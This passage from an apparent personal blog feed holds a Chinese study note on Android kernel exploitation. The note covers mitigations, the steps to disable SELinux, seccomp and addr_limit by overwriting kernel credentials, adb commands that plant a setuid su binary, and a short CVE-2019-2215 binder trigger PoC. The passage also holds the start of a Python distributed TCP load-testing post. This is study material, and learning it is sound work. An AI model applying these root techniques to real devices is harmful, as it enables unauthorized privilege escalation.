限制应用程序可以使用的系统调用，增加系统的安全性。shell中执行exp不会受到限制，apk中执行exp会受到seccomp限制，比如无法调到setuid、chroot、mount等。Android 8.0之后影响所有zygote孵化出来的进程。</li><li>KASLR 内核地址空间布局随机化，可以让kernel image映射的地址相对于链接地址有个偏移，利用需要泄露内核信息。Android kernel版本大于4.4之后默认开启。</li><li>AVB （Android  Verified Boot 启动时验证）启动时验证boot、system、vendor等是否被篡改，Persistent root 克星。Android 7.0 之后严格执行启动验证，Android 8.0 之后默认集成AVB2.0 ，有回滚保护，防止回滚到有漏洞的版本。</li></ul><h3 id="Android-内核漏洞利用基础知识"><a href="#Android-内核漏洞利用基础知识" class="headerlink" title="Android 内核漏洞利用基础知识"></a>Android 内核漏洞利用基础知识</h3><h4 id="内核关键数据结构"><a href="#内核关键数据结构" class="headerlink" title="内核关键数据结构"></a>内核关键数据结构</h4><ul><li><p>线程数据结构体，内核栈和hread_info共用一片区域 ,其中 addr_limit 用户态 0x7ffffffff000</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">union thread_union&#123;</span><br><span class="line">struct thread_info thread_info;</span><br><span class="line">unsigned long stack[THREAD_SIZE/sizeof(lone)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct thread_info&#123;</span><br><span class="line">unsigned long flag; /*low level flag*/</span><br><span class="line">mm_segment_t addr_limit; /*address limit */</span><br><span class="line">struct task_struct *task; </span><br><span class="line">struct exec_domain *exec_domian;  /* execution domain */</span><br><span class="line">struct restart_block restart_block;</span><br><span class="line">int preempt_count;</span><br><span class="line">int cpu;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>进程描述符</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">struct task_ struct &#123;</span><br><span class="line">volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */</span><br><span class="line">void *stack; // contains addr_ limi t</span><br><span class="line">unsigned int flags; /* per process flags, defined below */</span><br><span class="line">...</span><br><span class="line">struct list_ head tasks ;</span><br><span class="line">struct mm struct *mm， *active_ mm;</span><br><span class="line">#ifdef CONFIG COMPAT_ BRK</span><br><span class="line">unsigned brk randomized:1;</span><br><span class="line">...</span><br><span class="line">/* process credentials */</span><br><span class="line">const struct cred __rcu *real_cred; /* objective and real subjective task */</span><br><span class="line">consts truct cred __rcu *ered; /* effective (overridable) subjective task */</span><br><span class="line">char comm[TASK_COMM_LEN] ;</span><br><span class="line">...</span><br><span class="line">struct seccomp seccomp ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img alt="1579168735865.png" data-src="https://i.loli.net/2020/02/02/oBFsXaP8MplYzu1.png" class="lozad"></p><ul><li><p>安全凭证cred</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">unsigned int usage;</span><br><span class="line">uid_t uid;</span><br><span class="line">gid_t gid;</span><br><span class="line">uid_t suid;</span><br><span class="line">gid_t sgid; </span><br><span class="line">uid_t euid;</span><br><span class="line">gid_t egid;</span><br><span class="line">uid_t fsuid;</span><br><span class="line">gid_t fsgid;</span><br><span class="line">unsigned int securebits;</span><br><span class="line">struct kernel_cap_struct cap_inheritable;</span><br><span class="line">struct kernel_cap_struct Cap_permitted;</span><br><span class="line">struct kernel_cap_struct cap_ef fective;</span><br><span class="line">struct kernel_cap_struct cap_bset;</span><br><span class="line">struct kernel_cap_struct cap_ambient;</span><br><span class="line">void *security; /* subjective LSM security */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>安全凭证 task_secutity 安全域</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct task_ security_ struct &#123;</span><br><span class="line">u32 osid; /* SID prior to last execve */</span><br><span class="line">u32 sid; /* current SID */</span><br><span class="line">u32 exec_sid;/* exec SID */</span><br><span class="line">u32 create_sid;/* fscreate SID */</span><br><span class="line">u32 keycreate_sid; /* keycreate SID */</span><br><span class="line">u32 sockcreate_sid; /* fscreate SID */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>内核关键全局变量<br>selinux_enforcing<br>selinux_enabled<br>init_stack<br>对于没有KASLR的设备地址固定，偏移固定。</p></li></ul><h4 id="关闭内核缓释机制"><a href="#关闭内核缓释机制" class="headerlink" title="关闭内核缓释机制"></a>关闭内核缓释机制</h4><p>1、关闭addr_limit </p><ul><li>内核线程栈低偏移8字节为addr_limit,将addr_limit 改为-1（0xffffffffffffffff）,关闭之后即可任意读写内核。</li></ul><p>2、 关闭DAC </p><ul><li>修改进程安全凭证cred中进程id相关值uid、gid等为init进程的值</li></ul><p>3、关闭CAP </p><ul><li>修改进程安全凭证cred中的cap相关值 cap_inheritable等为init进程的值</li></ul><p>4、 关闭SELinux</p><ul><li>修改selinux_enforcing 为0</li><li>修改selinux_enbaled 为0</li><li>修改进程安全凭证cred中的security安全域 osid、sid、exec_sid、create_sid、kercreate_sid、sockcreate_sid为init进程的值</li></ul><p>5、关闭SECCOMP</p><ul><li><p>修改thread_info中的flags,将seccomp位置0</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TLE_SECCOMP 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TIF_SECCOMP (1 &lt;&lt; TIE_SECCOMP)</span></span><br></pre></td></tr></table></figure></li><li><p>修改task_struct 中的seccomp中的mode为0</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct seccopm &#123;</span><br><span class="line">int mode;</span><br><span class="line">struct seccomp_filter *filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="持久化root"><a href="#持久化root" class="headerlink" title="持久化root"></a>持久化root</h4><p>只适用于低版本Android：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb shell mount -0 remount,rw /system</span><br><span class="line">adb push su /system/xbin/su</span><br><span class="line">adb shell chown 0.0 /system/xbin/su</span><br><span class="line">adb shell chmod 06755 /system/xbin/su</span><br><span class="line">adb shell mount -0 remount,ro /system</span><br><span class="line">adb install Superuser.apk</span><br></pre></td></tr></table></figure></p><p>高版本(Android 7.0 之后) 无解</p><h4 id="Android-内核任意地址读写思路"><a href="#Android-内核任意地址读写思路" class="headerlink" title="Android 内核任意地址读写思路"></a>Android 内核任意地址读写思路</h4><p>1、用户态不能直接访问内核态<br>2、需要借助内核函数完成内核任意地址读写</p><ul><li>系统调用由内核完成</li><li>寻找系统调用中搬到参数合法的方式-&gt;addr_limit</li><li>read/write、readv/writev、recvmsg/sendmsg 等</li></ul><h2 id="Android源码阅读网站"><a href="#Android源码阅读网站" class="headerlink" title="Android源码阅读网站"></a>Android源码阅读网站</h2><ul><li>Google官方提供<br><a href="https://cs.android.com/android/platform/superproject" target="_blank" rel="noopener">https://cs.android.com/android/platform/superproject</a></li><li>在线xref<br>  <a href="http://androidxref.com/" target="_blank" rel="noopener">http://androidxref.com/</a></li></ul><h2 id="Android环境搭建"><a href="#Android环境搭建" class="headerlink" title="Android环境搭建"></a>Android环境搭建</h2><p>本地环境 ubuntu 16.04</p><ul><li>SDK安装<br><a href="https://developer.android.com/studio/releases/platform-tools" target="_blank" rel="noopener">https://developer.android.com/studio/releases/platform-tools</a><br>下载最新版29（截止2020.1）  确定adb可以使用<br>安装可参考 <a href="https://blog.csdn.net/u011974797/article/details/78973012" target="_blank" rel="noopener">https://blog.csdn.net/u011974797/article/details/78973012</a></li><li>NDK安装<br><a href="https://developer.android.com/ndk/downloads" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads</a><br>下载最新版r20b（截止2020.1）确定ndk-build可以使用<br>安装可参考 <a href="https://blog.csdn.net/fanx9339/article/details/81116332" target="_blank" rel="noopener">https://blog.csdn.net/fanx9339/article/details/81116332</a></li></ul><h2 id="Android-root实验"><a href="#Android-root实验" class="headerlink" title="Android root实验"></a>Android root实验</h2><p>给定一个含有驱动漏洞的Android虚拟机，通过该驱动漏洞实现root</p><h3 id="1-1-确定Android版本号"><a href="#1-1-确定Android版本号" class="headerlink" title="1.1 确定Android版本号"></a>1.1 确定Android版本号</h3><p>adb shell getprop ro.build.version.release</p><h3 id="1-2-寻找有漏洞的驱动设备"><a href="#1-2-寻找有漏洞的驱动设备" class="headerlink" title="1.2 寻找有漏洞的驱动设备"></a>1.2 寻找有漏洞的驱动设备</h3><p>搜索 cdev_init()函数<br>cdev_init() 加载驱动设备函数<br><img alt="1579157694160.png" data-src="https://i.loli.net/2020/02/02/ErcVTB6nq3DSsya.png" class="lozad"><br>qword_FFFFFFC00055C438 里面注册 dev_open,dev_ioctl等<br><img alt="1579157575646.png" data-src="https://i.loli.net/2020/02/02/GcL7xFIm2zOVHkj.png" class="lozad"></p><h3 id="1-3-提取kernel符号表"><a href="#1-3-提取kernel符号表" class="headerlink" title="1.3 提取kernel符号表"></a>1.3 提取kernel符号表</h3><p>python ./vmlinux.py ./test/pixel_vmlinux</p><h3 id="1-4-IDA加载kernel并导入符号表"><a href="#1-4-IDA加载kernel并导入符号表" class="headerlink" title="1.4 IDA加载kernel并导入符号表"></a>1.4 IDA加载kernel并导入符号表</h3><p>vmlinux.py        -&gt;        C:\Program Files\IDA x.x\loaders\</p><h3 id="1-5-分析漏洞并完成kernel任意地址读写"><a href="#1-5-分析漏洞并完成kernel任意地址读写" class="headerlink" title="1.5 分析漏洞并完成kernel任意地址读写"></a>1.5 分析漏洞并完成kernel任意地址读写</h3><p>通过fop发现ioctl中存在任意地址读写漏洞<br><img alt="1579159294971.png" data-src="https://i.loli.net/2020/02/02/HQRKcxVIS7Jm1uF.png" class="lozad"></p><h3 id="1-6-提权到root"><a href="#1-6-提权到root" class="headerlink" title="1.6 提权到root"></a>1.6 提权到root</h3><h2 id="CVE-2019-2215-复现"><a href="#CVE-2019-2215-复现" class="headerlink" title="CVE-2019-2215 复现"></a>CVE-2019-2215 复现</h2><p>影响版本 Android 9.0 kernel 4.4</p><p>driver/android/binder.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">binder_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> BINDER_THREAD_EXIT:</span><br><span class="line">binder_debug(BINDER_DEBUG_THREADS, <span class="string">"%d:%d exit\n"</span>,</span><br><span class="line">proc-&gt;pid, thread-&gt;pid);</span><br><span class="line">binder_free_thread(proc, thread);</span><br><span class="line">thread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Android kernel    4.4        driver/android/binder.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">binder_free_thread</span><span class="params">(struct binder_proc *proc,</span></span></span><br><span class="line"><span class="function"><span class="params">struct binder_thread *thread)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (send_reply)</span><br><span class="line">binder_send_failed_reply(send_reply, BR_DEAD_REPLY);</span><br><span class="line">binder_release_work(&amp;thread-&gt;todo);</span><br><span class="line">kfree(thread);</span><br><span class="line">binder_stats_deleted(BINDER_STAT_THREAD);</span><br><span class="line"><span class="keyword">return</span> active_transactions; &#125;</span><br></pre></td></tr></table></figure></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd, epfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> = &#123;</span> .events = EPOLLIN &#125;;</span><br><span class="line">fd = open(<span class="string">"/dev/binder0"</span>, O_RDONLY);</span><br><span class="line">epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);</span><br><span class="line">ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>##其他命令<br>连接 Android shell<br>./adb shell </p><p>1、获取手机系统信息（ CPU，厂商名称等）<br>adb shell “cat /system/build.prop | grep “product””<br>2、获取手机系统版本<br>adb shell getprop ro.build.version.release</p><p>3、获取手机系统api版本<br>adb shell getprop ro.build.version.sdk</p><p>4、获取手机设备型号<br>adb -d shell getprop ro.product.model</p><p>5、获取手机厂商名称<br>adb -d shell getprop ro.product.brand</p><p>6、获取手机的序列号<br>有两种方式</p><ul><li>1、  adb get-serialno</li><li>2、  adb shell getprop ro.serialno</li></ul><p>7、获取手机内存信息<br>adb shell cat /proc/meminfo</p><p>8、获取手机存储信息<br>adb shell df</p><p>9、获取手机物理密度<br>adb shell wm density</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;h3 id=&quot;Android-系统架构&quot;&gt;&lt;a href=&quot;#Android-系统架构&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="android" scheme="https://nocbtm.github.io/categories/android/"/>
    
    
      <category term="android" scheme="https://nocbtm.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>分布式高并发tcp压力测试</title>
    <link href="https://nocbtm.github.io/2019/12/10/%E5%88%86%E5%B8%83%E5%BC%8F%E9%AB%98%E5%B9%B6%E5%8F%91tcp%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"/>
    <id>https://nocbtm.github.io/2019/12/10/分布式高并发tcp压力测试/</id>
    <published>2019-12-10T10:47:15.000Z</published>
    <updated>2020-02-01T11:04:04.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="task-manager-py"><a href="#task-manager-py" class="headerlink" title="task_manager.py"></a>task_manager.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.managers <span class="keyword">import</span> BaseManager</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> freeze_support, Queue</span><br><span class="line"><span class="keyword">from</span> locustTcp <span class="keyword">import</span> locust</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任务个数</span></span><br><span class="line">task_number = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 收发队列</span></span><br><span class="line">task_que = Queue(task_number)</span><br><span class="line">result_queue = Queue(task_number)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_task</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> task_que</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> result_queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类似的queueManager</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueManager</span><span class="params">(BaseManager)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">win_run</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    delay_time_average, delay_time_average_total = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    delay_time_max, delay_time_min, error_times, success_times = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    time_max = []</span><br><span class="line">    time_min = []</span><br><span class="line">    <span class="comment"># 注册在网络上，callable 关联了Queue 对象</span></span><br><span class="line">    <span class="comment"># 将Queue对象在网络中暴露</span></span><br><span class="line">    <span class="comment"># window下绑定调用接口不能直接使用lambda，所以只能先定义函数再绑定</span></span><br><span class="line">    QueueManager.register(<span class="string">'get_task_queue'</span>, callable=get_task)</span><br><span class="line">    QueueManager.register(<span class="string">'get_result_queue'</span>, callable=get_result)</span><br><span class="line">    <span class="comment"># 绑定端口和设置验证口令</span></span><br><span class="line">    manager = QueueManager(address=(<span class="string">'192.168.43.140'</span>, <span class="number">8001</span>), authkey=<span class="string">b'locust'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动管理，监听信息通道</span></span><br><span class="line">    manager.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 通过网络获取任务队列和结果队列</span></span><br><span class="line">        task = manager.get_task_queue()</span><br><span class="line">        result = manager.get_result_queue()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 添加任务</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(task_number):</span><br><span class="line">            n = locust</span><br><span class="line">            task.put(n)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">'try get result...'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(task_number):</span><br><span class="line">            data = result.get(timeout=<span class="number">10000</span>)</span><br><span class="line">            print(<span class="string">'result%d is %s'</span> % (i+<span class="number">1</span>, data))</span><br><span class="line">            data = eval(data)</span><br><span class="line">            print(<span class="string">"平均往返时延(ms): %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n"</span> %</span><br><span class="line">                  (data[<span class="number">0</span>], data[<span class="number">2</span>], data[<span class="number">3</span>], data[<span class="number">4</span>], data[<span class="number">5</span>]))</span><br><span class="line">            delay_time_average_total += data[<span class="number">0</span>]</span><br><span class="line">            time_max.append(data[<span class="number">2</span>])</span><br><span class="line">            time_min.append(data[<span class="number">3</span>])</span><br><span class="line">            error_times += data[<span class="number">4</span>]</span><br><span class="line">            success_times += data[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">        delay_time_average = delay_time_average_total/task_number</span><br><span class="line">        delay_time_max = max(time_max)</span><br><span class="line">        delay_time_min = min(time_min)</span><br><span class="line">        print(<span class="string">"最终统计 平均往返时延(ms): %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n"</span> %</span><br><span class="line">              (delay_time_average, delay_time_max, delay_time_min, error_times, success_times))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'Manager error:'</span>, e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        manager.shutdown()</span><br><span class="line">        print(<span class="string">"Work is done"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># window下多进程可能有问题，添加这句话缓解</span></span><br><span class="line">    freeze_support()</span><br><span class="line">    win_run()</span><br></pre></td></tr></table></figure><h2 id="task-worker-py"><a href="#task-worker-py" class="headerlink" title="task_worker.py"></a>task_worker.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.managers <span class="keyword">import</span> BaseManager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类似的QueueManager:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueManager</span><span class="params">(BaseManager)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现第一步：使用QueueManager注册获取Queue的方法名称</span></span><br><span class="line">QueueManager.register(<span class="string">'get_task_queue'</span>)</span><br><span class="line">QueueManager.register(<span class="string">'get_result_queue'</span>)</span><br><span class="line"><span class="comment"># 实现第二步：连接到服务器:</span></span><br><span class="line">server_addr = <span class="string">'192.168.43.140'</span></span><br><span class="line">print(<span class="string">'Connect to server %s...'</span> % server_addr)</span><br><span class="line"><span class="comment"># 端口和验证口令注意保持与服务进程设置的完全一致:</span></span><br><span class="line">m = QueueManager(address=(server_addr, <span class="number">8001</span>), authkey=<span class="string">b'locust'</span>)</span><br><span class="line"><span class="comment"># 从网络连接:</span></span><br><span class="line">m.connect()</span><br><span class="line"><span class="comment"># 实现第三步：获取Queue的对象:</span></span><br><span class="line">task = m.get_task_queue()</span><br><span class="line">result = m.get_result_queue()</span><br><span class="line"><span class="comment"># 实现第四步：从task队列取任务,并把结果写入result队列:</span></span><br><span class="line">task_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> task.empty():</span><br><span class="line">    locust = task.get(<span class="keyword">True</span>, timeout=<span class="number">5</span>)  <span class="comment"># 获取任务</span></span><br><span class="line">    task_num += <span class="number">1</span></span><br><span class="line">    a = locust()     <span class="comment"># 执行任务</span></span><br><span class="line">    <span class="comment"># result.put(str(a[-1][1]))  # 传输数据到task_manager</span></span><br><span class="line"></span><br><span class="line">    result.put(str(a[<span class="number">-1</span>][<span class="number">0</span>]))  <span class="comment"># 传输数据到task_manager</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理结束:</span></span><br><span class="line">print(<span class="string">"任务完成个数: %d"</span> % task_num)</span><br><span class="line">print(<span class="string">'worker exit.'</span>)</span><br></pre></td></tr></table></figure><h2 id="locustTcp-py"><a href="#locustTcp-py" class="headerlink" title="locustTcp.py"></a>locustTcp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 